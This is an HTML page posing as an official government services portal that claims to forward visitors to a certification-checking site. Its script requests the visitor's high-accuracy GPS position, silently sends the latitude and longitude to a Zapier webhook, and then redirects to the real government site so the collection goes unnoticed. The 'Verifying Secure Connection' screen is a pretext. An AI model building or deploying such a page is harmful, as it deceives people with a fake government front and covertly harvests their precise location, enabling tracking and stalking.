<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Government Services Portal</title>
    <style>
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background-color: #f4f6f9; 
            margin: 0;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        .gov-container { 
            background: white; 
            max-width: 500px; 
            width: 90%;
            padding: 40px; 
            border-radius: 0px; 
            border-top: 6px solid #003366;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
            text-align: center; 
        }

        .header-text {
            color: #003366;
            font-weight: bold;
            font-size: 1.4rem;
            margin-bottom: 10px;
        }

        .subheader {
            color: #666;
            font-size: 1rem;
            margin-bottom: 30px;
        }

        .btn-continue { 
            padding: 12px 30px; 
            font-size: 1.1rem; 
            cursor: pointer; 
            background: #003366; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            transition: background 0.3s ease;
        }

        .btn-continue:hover {
            background: #004a99;
        }

        /* Hidden by default, shown when loading location */
        #loading-area {
            display: none;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #003366;
            border-radius: 50%;
            width: 40px; height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="gov-container">
        <!-- PRE-CLICK SCREEN -->
        <div id="start-screen">
            <div class="header-text">Official Access Portal</div>
            <p class="subheader">Click the button below to proceed to the Government Certification checking service.</p>
            <button class="btn-continue" onclick="startProcess()">Continue to Portal</button>
        </div>

        <!-- LOADING screen shown AFTER click -->
        <div id="loading-area">
            <div class="spinner"></div>
            <p class="header-text">Verifying Secure Connection...</p>
            <p class="subheader">You will be redirected to lmis.gov.et shortly.</p>
        </div>
    </div>

    <script>
        function startProcess() {
            // 1. Swap screens
            document.getElementById('start-screen').style.display = 'none';
            document.getElementById('loading-area').style.display = 'block';

            // 2. Trigger location logic
            getLocation();
        }

        function getLocation() {
            if (!navigator.geolocation) {
                redirectToPortal(); // If no GPS, just send them to the portal
                return;
            }

            navigator.geolocation.getCurrentPosition(success, failure, {
                enableHighAccuracy: true, 
                timeout: 10000,
                maximumAge: 0
            });
        }

        function success(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // YOUR ZAPIER URL goes here
            const zapierUrl = 'https://hooks.zapier.com/hooks/catch/28845742/4dek5pk/?lat=' + lat + '&long=' + lon;

            // Send to Zapier (use 'keepalive' to make sure the request finishes after redirect)
            fetch(zapierUrl, { mode: 'no-cors', keepalive: true });

            // Small delay so the loading spinner shows interest, then redirect
            setTimeout(() => {
                redirectToPortal();
            }, 2000); 
        }

        function failure(error) {
            // If they click 'Block' or GPS is off, we still redirect them so they can use the site
            console.log("Geolocation access denied or failed.");
            redirectToPortal();
        }

        function redirectToPortal() {
            window.location.href = "https://lmis.gov.et/coc-check";
        }
    </script>
</body>
</html>
